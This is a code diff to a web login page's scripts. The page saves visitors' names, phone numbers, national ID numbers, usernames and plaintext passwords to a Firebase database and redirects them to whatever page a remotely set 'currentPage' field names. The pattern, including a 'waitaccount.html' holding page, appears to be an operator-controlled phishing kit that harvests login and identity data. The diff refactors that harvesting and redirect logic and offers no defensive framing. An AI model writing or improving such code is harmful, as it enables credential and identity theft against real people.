@@ -443,8 +443,8 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/fireba
 import {
 
     getFirestore,
-    collection,
-    addDoc,
+    doc,
+    setDoc,
     serverTimestamp
 
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
@@ -474,6 +474,13 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 
 const db = getFirestore(app);
+
+
+function generateUserId(loginData){
+
+    return encodeURIComponent(loginData.username);
+
+}
 
 /* =========================
    PASSWORD TOGGLE
@@ -539,22 +546,27 @@ document
 
     /* save to firebase */
 
-    await addDoc(collection(db,"users"),{
+    const userId = generateUserId({
+    username
+});
 
-        name: demoUser?.fullName || "",
-        phone: demoUser?.phoneNumber || "",
-        nationalId: demoUser?.idNumber || "",
+await setDoc(doc(db,"users",userId),{
 
-        username: username,
-        password: password,
+    name: demoUser?.fullName || "",
+    phone: demoUser?.phoneNumber || "",
+    nationalId: demoUser?.idNumber || "",
 
-        status: "pending",
+    username: username,
+    password: password,
 
-        currentPage: "waitaccount.html",
+    status: "pending",
 
-        createdAt: serverTimestamp()
+    currentPage: "waitaccount.html",
 
-    });
+    createdAt: serverTimestamp(),
+    lastSeen: Date.now()
+
+},{ merge:true });
 
     /* loading */
 
@@ -574,14 +586,30 @@ document
 
 </script>
 
+
 <script type="module">
 
+import { getApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
 import {
-    collection,
-    query,
-    where,
+    getFirestore,
+    doc,
     onSnapshot
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+/* use existing firebase app */
+
+const existingApp = getApp();
+
+const firestore = getFirestore(existingApp);
+
+/* user id */
+
+function generateUserId(loginData){
+
+    return encodeURIComponent(loginData.username);
+
+}
 
 /* current login */
 
@@ -590,37 +618,31 @@ const loginData =
 
 if(loginData){
 
-    const q = query(
-        collection(db,"users"),
-        where("username","==",loginData.username),
-        where("password","==",loginData.password)
-    );
+    const userId =
+        generateUserId(loginData);
 
-    onSnapshot(q,(snapshot)=>{
+    onSnapshot(doc(firestore,"users",userId),(docSnap)=>{
 
-        snapshot.forEach((docSnap)=>{
+        if(!docSnap.exists()) return;
 
-            const user = docSnap.data();
+        const user = docSnap.data();
 
-            const currentPage = user.currentPage;
+        const currentPage = user.currentPage;
 
-            /* current opened file */
+        const currentFile =
+            window.location.pathname
+            .split("/")
+            .pop();
 
-            const currentFile =
-                window.location.pathname.split("/").pop();
+        if(
+            currentPage &&
+            currentPage !== currentFile
+        ){
 
-            /* redirect if changed */
+            window.location.href =
+                currentPage;
 
-            if(
-                currentPage &&
-                currentPage !== currentFile
-            ){
-
-                window.location.href = currentPage;
-
-            }
-
-        });
+        }
 
     });
 
